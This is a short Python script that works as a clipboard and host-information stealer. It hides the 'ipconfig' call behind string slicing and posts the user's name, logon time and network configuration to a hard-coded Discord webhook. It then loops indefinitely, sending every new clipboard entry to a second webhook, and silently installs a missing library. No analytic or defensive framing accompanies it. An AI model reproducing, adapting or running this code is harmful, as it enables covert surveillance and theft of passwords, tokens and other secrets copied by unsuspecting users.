import os
import time
import requests

uname = os.getenv("USERNAME")

sic = 'pver-india'[5] + 'pver-india'[0] + "config"
iport = os.system(sic + " > " + os.getenv("TEMP") + "\\config.file")
# time.sleep(1)
with open(os.getenv("TEMP") + "\\config.file", "r") as f:
	para = f.read()

# print(uname)
# print(para)
# print(time.ctime() + f" [{time.time()}]")

cont = f'''
User: `{uname}`
Logon: `{time.ctime() + f" [{time.time()}]"}`
```
{para}
```
'''

bot = {"content": cont,
		"username": "Login",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/959858917830168616/unknown.png',
		"tts": "false"}
ping = requests.post('https://discord.com/api/webhooks/953679426632187904/H-1MG3mxQjnPphYjZKtj6HwlCil_pSob7OwcW9Ze3A011CR4BRHtBETaFY4qToHXnhVi', json=bot)

def stopSEND():
	newCOPY = "```\n" + newCOPY + "\n```"
	usrhook = {"content": "KOPIER INTERUPT",
		"username": "Kopier",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
		"tts": "false"}
	ping = requests.post('https://discord.com/api/webhooks/960113345959178290/ITfAMUa1x0IPDvGmIdWWbLewCa6JeMLDPcftMSrMJ6PHS31PnEAsA9J9ATena3Rt-dAr', json=usrhook)

try:
	import pyperclip
except:
	os.system("py -m pip install pyperclip")
finally:
	import pyperclip

while True:
	newCOPY = pyperclip.waitForNewPaste()
	# print(newCOPY)
	newCOPY = "```\n" + newCOPY + "\n```"
	usrhook = {"content": newCOPY,
		"username": "Kopier",
		"avatar_url": 'https://media.discordapp.net/attachments/881416619937660928/960113214371299388/unknown.png',
		"tts": "false"}
	ping = requests.post('https://discord.com/api/webhooks/960113345959178290/ITfAMUa1x0IPDvGmIdWWbLewCa6JeMLDPcftMSrMJ6PHS31PnEAsA9J9ATena3Rt-dAr', json=usrhook)
	if newCOPY == "Q01EOlNUT1BbbV1Lb3BpZXI=":
		print('DETECTING...')
		stopSEND()
		break
